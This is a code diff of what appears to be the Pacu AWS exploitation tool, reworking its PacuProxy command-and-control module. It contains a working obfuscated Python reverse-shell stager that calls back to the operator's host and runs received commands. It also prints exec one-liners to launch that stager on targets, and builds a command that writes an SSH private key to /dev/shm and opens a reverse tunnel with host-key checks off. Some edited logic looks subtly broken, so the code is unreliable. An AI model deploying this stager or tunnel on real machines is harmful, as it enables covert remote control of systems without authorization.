@@ -12,6 +12,7 @@ import threading
 import random
 import string
 from queue import Queue
+from functools import partial
 
 import configure_settings
 import settings
@@ -342,14 +343,14 @@ class util(object):
 
 def start_proxy(queue, database):
     proxy_settings = ProxySettings.get_proxy_settings(database)
-    server = create_workers(queue, proxy_settings.ip, proxy_settings.port)
+    server = create_workers(queue, proxy_settings.ip, proxy_settings.port, database)
     create_jobs(queue)
     return server
 
 # Create the proxy threads
-def create_workers(queue, proxy_ip, proxy_port):
+def create_workers(queue, proxy_ip, proxy_port, database):
     server = PacuProxy()
-    server.prepare_server(proxy_ip, proxy_port)
+    server.prepare_server(database)
     for _ in range(2):
         t = threading.Thread(target=work, args=(server, queue,), daemon=True)
         t.daemon = True
@@ -377,45 +378,46 @@ def create_jobs(queue):
 
 
 def get_ssh_user(ssh_username, database):
+    user_id = ''
     if ssh_username is None or ssh_username == '':
         new_user = util.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ', database)
 
         if new_user == 'y':
             # Create a random username that is randomly 3-9 characters
             username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
-            command = 'adduser --shell /bin/false --gecos "" --disabled-password {}'.format(username)
+            command = 'useradd -l -m -s /bin/false {}'.format(username)
             util.print('Running command: {}\n'.format(command), database)
             try:
-                subprocess.run(command.split(' '), shell=True)
+                subprocess.run(command.split(' '))
                 try:
-                    user_id = subprocess.check_output('id -u {}'.format(username), shell=True)
+                    user_id = subprocess.check_output('id -u {}'.format(username), shell=True).decode('utf-8')
                     if 'no such user' in user_id:
-                        util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id), database)
+                        util.print('[0] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id), database)
                         return None
                     util.print('User {} created successfully!\n'.format(username), database)
                     return username
                 except Exception as e:
-                    util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id), database)
+                    util.print('[1] Failed to find user after creation. Here is the output from the command "id -u {}": {}\n'.format(username, user_id), database)
                     return None
             except:
-                util.print('Failed to create user...', database)
+                util.print('[2] Failed to create user...', database)
                 return None
         else:
             return None
     else:
         try:
-            user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True)
+            user_id = subprocess.check_output('id -u {}'.format(ssh_username), shell=True).decode('utf-8')
             if 'no such user' in user_id:
-                util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id), database)
+                util.print('[3] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id), database)
                 new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ', database)
                 if new_user == 'y':
                     return get_ssh_user(None, database)
                 else:
                     return None
             else:
-                return proxy_data
+                return ssh_username
         except Exception as e:
-            util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id), database)
+            util.print('[4] Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}\n'.format(ssh_username, user_id), database)
             new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ', database)
             if new_user == 'y':
                 return get_ssh_user(None, database)
@@ -430,34 +432,43 @@ def get_ssh_key(ssh_username, ssh_priv_key, database):
         if new_key == 'y':
             util.print('Setting up SSH access for user {}...\n'.format(ssh_username), database)
             ssh_dir = '/home/{}/.ssh'.format(ssh_username)
-            command = 'ssh-keygen -t rsa -f {}/id_rsa -N ""'.format(ssh_dir)
+            command = "ssh-keygen -t rsa -f {}/id_rsa".format(ssh_dir)
             try:
                 util.print('Creating .ssh dir for user {} and passing ownership...'.format(ssh_username), database)
-                if os.path.isdir(ssh_dir):
+                if not os.path.isdir(ssh_dir):
                     os.makedirs(ssh_dir)
-                subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir), shell=True)
-                subprocess.run('chmod 700 {}'.format(ssh_dir), shell=True)
+                subprocess.run('chown -R {}:{} {}'.format(ssh_username, ssh_username, ssh_dir).split(' '))
+                subprocess.run('chmod 700 {}'.format(ssh_dir).split(' '))
                 util.print('Generating public and private SSH key...', database)
-                subprocess.run(command, shell=True)
+                subprocess.run(command.split(' '))
                 util.print('Creating authorized_keys file...', database)
-                subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir))
+                subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))
 
                 util.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...', database)
-                with open('/etc/sshd_config', 'rw') as f:
+                replace = contents = ''
+                with open('/etc/ssh/sshd_config', 'r') as f:
                     contents = f.read()
                     if 'AllowTcpForwarding' in contents:
                         if 'AllowTcpForwarding remote' in contents:
                             util.print('Already disabled.', database)
                         else:
-                            re.sub(r'AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
+                            action = 'replace'
                     else:
+                        action = 'add'
+
+                with open('/etc/ssh/sshd_config', 'w') as f:
+                    if action == 'update':
+                        re.sub(r'AllowTcpForwarding.*', 'AllowTcpForwarding remote', contents)
+                        f.write(contents)
+                    elif action == 'add':
+                        contents += '\nAllowTcpForwarding remote'
                         f.write(contents)
                 with open('{}/id_rsa'.format(ssh_dir), 'r') as f:
                     ssh_priv_key = f.read()
 
                 return ssh_priv_key
             except:
-                util.print('Could not setup SSH access for user {}...'.format(ssh_priv_key), database)
+                util.print('[5] Could not setup SSH access for user {}...'.format(ssh_priv_key), database)
                 return None
         else:
             return None
@@ -473,7 +484,7 @@ def parse_command(command, server, queue, database):
 
     if command[0] == '':
         return server, queue
-    elif cmd[0] == 'proxy':
+    elif command[0] == 'proxy':
         proxy_settings = ProxySettings.get_proxy_settings(database)
         proxy_ip = proxy_settings.ip
         proxy_port = proxy_settings.port
@@ -482,7 +493,7 @@ def parse_command(command, server, queue, database):
         proxy_ssh_priv_key = proxy_settings.ssh_priv_key
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
 
-        if len(cmd) == 1: # Display proxy help
+        if len(command) == 1: # Display proxy help
             print("""
     PacuProxy command info:
         proxy                               Control PacuProxy/display help
@@ -500,13 +511,16 @@ def parse_command(command, server, queue, database):
                                                   (win). The only difference in the payloads is how
                                                   command-line escaping is done for valid syntax.
 """)
-        elif cmd[1] == 'start': # Start proxy server
+        elif command[1] == 'start': # Start proxy server
+            if len(command) < 3:
+                util.print('You need to pass at least an IP address to proxy start: proxy start <ip> [<port>]', database)
+                return server, queue
             if proxy_listening is False:
-                if len(cmd) == 4:
-                    proxy_port = cmd[3]
+                if len(command) == 4:
+                    proxy_port = command[3]
                 else:
                     proxy_port = 80
-                proxy_ip = cmd[2]
+                proxy_ip = command[2]
                 print('Starting PacuProxy on {}:{}...'.format(proxy_ip, proxy_port))
                 proxy_settings.update(database, ip=proxy_ip, port=proxy_port)
                 server = start_proxy(queue, database)
@@ -515,11 +529,14 @@ def parse_command(command, server, queue, database):
                 return server, queue
             else:
                 print('There already seems to be a listener running: {}'.format(server))
-        elif cmd[1] == 'list' or cmd[1] == 'ls': # List active agent connections
+        elif command[1] == 'list' or command[1] == 'ls': # List active agent connections
             server.list_connections()
-        elif cmd[1] == 'shell' and len(cmd) > 3: # Run shell command on an agent  
-            server.run_cmd(int(cmd[2]), server.all_connections[int(cmd[2])], ' '.join(cmd[3:]))
-        elif cmd[1] == 'stop': # Stop proxy server
+        elif command[1] == 'shell': # Run shell command on an agent
+            if len(command) > 3:
+                server.run_cmd(int(command[2]), server.all_connections[int(command[2])], ' '.join(command[3:]))
+            else:
+                print('** Incorrect input, expected an agent ID and a shell command. Use the format: proxy shell <agent_id> <shell command> **')
+        elif command[1] == 'stop': # Stop proxy server
             if proxy_listening is False:
                 print('There does not seem to be a listener running currently.')
             else:
@@ -528,34 +545,39 @@ def parse_command(command, server, queue, database):
                 server = None
                 proxy_listening = False
                 proxy_target_agent = []
-        elif cmd[1] == 'kill': # Kill an agent connection
-            if len(cmd) == 3:
-                util.print('** Killing agent {}... **'.format(int(cmd[2])), database)
-                server.quit(int(cmd[2]), server.all_connections[int(cmd[2])])
+        elif command[1] == 'kill': # Kill an agent connection
+            if len(command) == 3:
+                util.print('** Killing agent {}... **'.format(int(command[2])), database)
+                server.quit(int(command[2]), server.all_connections[int(command[2])])
                 util.print('** Agent killed **', database)
-            elif len(cmd) == 2:
+            elif len(command) == 2:
                 print(' ** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
             else:
-                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
-        elif cmd[1] == 'stager':
-            if len(cmd) == 3:
+                print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
+        elif command[1] == 'stager':
+            if len(command) == 3:
                 python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_ip, proxy_port)
-                if cmd[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
+                if command[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
                     util.print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)), database)
-                elif cmd[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
+                elif command[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
                     util.print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)), database)
                 else:
-                    util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]), database)
+                    util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]), database)
             else:
-                util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]), database)
-        elif cmd[1] == 'use':
-            if len(cmd) == 3:
+                util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]), database)
+        elif command[1] == 'use':
+            if len(command) == 3:
                 try:
-                    if cmd[2] == 'none':
-                        util.print('No longer using a remote PacuProxy agent to route commands...', database)
+                    if command[2] == 'none':
+                        util.print('** No longer using a remote PacuProxy agent to route commands. **', database)
                         proxy_target_agent = []
                     else:
-                        print('Setting proxy target to agent {}...'.format(cmd[2]))
+                        try:
+                            test = int(command[2])
+                        except:
+                            util.print('** Invalid agent ID, expected an integer or "none", received: {} **'.format(command[2]))
+                            return server, queue
+                        print('Setting proxy target to agent {}...'.format(command[2]))
 
                         # Find or create an SSH user
                         proxy_ssh_username = get_ssh_user(proxy_ssh_username, database)
@@ -587,14 +609,15 @@ def parse_command(command, server, queue, database):
                                 subprocess.run('service sshd restart', shell=True)
 
                         util.print('Telling remote agent to connect back...', database)
-                        proxy_target_agent = server.all_addresses[int(cmd[2])]
-                        shm_name = ''.join(random.choices(string.ascii_lowercase + string.ascii_digits, k=int(''.join(random.choices('3456789', k=1)))))
+                        proxy_target_agent = server.all_addresses[int(command[2])]
+                        shm_name = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
                         connect_back_cmd = 'echo "{}" > /dev/shm/{} && chmod 600 /dev/shm/{} && ssh -i /dev/shm/{} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 8000 {}@{} >/dev/null 2>&1'.format(proxy_ssh_priv_key, shm_name, shm_name, shm_name, proxy_ssh_username, proxy_ip)
-                        server.run_cmd(proxy_target_agent[0], server.all_connections[int(cmd[2])], connect_back_cmd)
-                except:
-                    util.print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]), database)
+                        server.run_cmd(proxy_target_agent[0], server.all_connections[int(command[2])], connect_back_cmd)
+                        util.print('Remote agent connected!', database)
+                except Exception as e:
+                    util.print('** Invalid agent ID, expected an integer or "none": {} **'.format(e), database)
             else:
-                util.print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]), database)
+                util.print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]), database)
         proxy_settings.update(database, ssh_username=proxy_ssh_username, ssh_priv_key=proxy_ssh_priv_key, listening=proxy_listening, target_agent=proxy_target_agent)
         return server, queue
     elif (command[0] == 'run' or command[0] == 'exec') and len(command) > 1:
@@ -704,10 +727,10 @@ def exec_module(command, database):
         ## XML Command Log - Figure out how to auto convert to XML
         # util.print('<command>{}</command>'.format(cmd), database, output_type='xml', output='file')
 
-        if proxy_settings.proxy_target is None or proxy_settings.proxy_target == []:
+        if proxy_settings.target_agent is None or proxy_settings.target_agent == []:
             util.print('  Running module {}...'.format(module_name), database)
         else:
-            util.print('  Running module {} on agent {}...'.format(module_name, proxy_settings.proxy_target[0]), database)
+            util.print('  Running module {} on agent {}...'.format(module_name, proxy_settings.target_agent[0]), database)
         util.print('    {}\n'.format(module.help()[0]['description']), database)
 
         try:
@@ -1012,7 +1035,8 @@ def get_data_from_traceback(tb):
 
 def main():
     idle_ready = False
-    server = None
+    server = PacuProxy()
+    proxy = ProxySettings()
     queue = Queue()
 
     while True:
@@ -1087,7 +1111,10 @@ def main():
                 display_help()
 
                 proxy_settings = ProxySettings.get_proxy_settings(database)
-                if proxy_settings.listening is True:
+                if proxy_settings is None:
+                    proxy.activate(database)
+                    proxy_settings = ProxySettings.get_proxy_settings(database)
+                if proxy_settings is not None and proxy_settings.listening is True:
                     # PacuProxy was listening on last shutdown, so restart it
                     server = start_proxy(queue, database)
 
